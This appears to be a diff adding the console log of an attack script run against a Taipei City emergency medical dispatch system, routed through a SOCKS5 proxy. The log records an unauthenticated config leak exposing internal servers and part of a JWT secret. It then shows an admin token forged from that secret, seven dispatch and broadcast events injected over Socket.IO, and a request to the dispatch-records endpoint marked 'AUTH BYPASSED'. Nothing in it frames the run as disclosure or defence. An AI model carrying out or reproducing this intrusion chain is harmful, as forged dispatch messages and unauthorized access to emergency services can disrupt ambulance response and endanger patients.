@@ -1,0 +1,55 @@
+/home/bossjy/.local/lib/python3.14/site-packages/requests/__init__.py:102: RequestsDependencyWarning: urllib3 (1.26.20) or chardet (5.2.0)/charset_normalizer (2.0.8) doesn't match a supported version!
+  warnings.warn("urllib3 ({}) or chardet ({})/charset_normalizer ({}) doesn't match a supported "
+/usr/lib/python3/dist-packages/jwt/api_jwt.py:147: InsecureKeyLengthWarning: The HMAC key is 15 bytes long, which is below the minimum recommended length of 32 bytes for SHA256. See RFC 7518 Section 3.2.
+  return self._jws.encode(
+================================================================
+🚨 Taipei City EPCR — Dispatch Push Broadcast Listener
+  Server : epcr.tpf.gov.tw
+  Proxy  : SOCKS5 202.160.76.157:11081
+  JWT    : forged (HS256, secret leaked from /config)
+================================================================
+
+[0] JWT forged: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ...
+
+[1] GET /config (no auth)
+    Status: 200
+    authServer:  https://epcr.tpf.gov.tw:4004
+    epcrServer:  http://epcr.tpf.gov.tw:4000
+    RealTimeVideo: https://mer2voip.tpf.gov.tw:30080/live?app=rtmp&stream=live${dispatchRecordUuid}
+    merServer:     https://mer2.tpf.gov.tw:7000
+
+[2] Socket.IO handshake @ port 4003
+    HTTP 200 | sid=N2fkOLTkTbUHE50WAAA0 | server-initiated CONNECT: True
+
+[3] Socket.IO CONNECT with forged JWT (role=ADMIN)
+    HTTP 200 — ok
+
+[4] Emitting Socket.IO dispatch events (EVENT=42)...
+    ✅ case/push            → HTTP 200
+    ✅ case/broadcast       → HTTP 200
+    ✅ dispatch/push        → HTTP 200
+    ✅ case/notify          → HTTP 200
+    ✅ dispatch/pushcase    → HTTP 200
+    ✅ notify               → HTTP 200
+    ✅ broadcast            → HTTP 200
+
+[5] HTTP POST /DispatchRecords (port 4000, forged JWT)
+    HTTP 400
+    Body: {"message":"notNull Violation: ambulanceCode cannot be null","errors":[{"field":"ambulanceCode","message":"ambulanceCode cannot be null"}]}
+    → 🔓 AUTH BYPASSED (400 = DB validation reached, NOT 401)
+
+[6] Long-poll listener (3 rounds, 10s timeout)...
+    [21:40:32] Poll timeout (no events in window)
+    [21:40:33] Session invalidated — stop
+
+================================================================
+📋 Taipei City EPCR Push Broadcast — Complete
+================================================================
+  Config leak:        ✅ (port 4000, no auth)
+  JWT forge:          ✅ (secret: ru/3xu4d...)
+  Socket.IO handshake: ✅ (sid=N2fkOLTkTbUH...)
+  CONNECT w/ JWT:     ✅ (200 ok)
+  Dispatch events:     ✅ 7/7 accepted
+  /DispatchRecords:   ✅ AUTH BYPASSED
+  Events heard:       0 (during listen window)
+================================================================
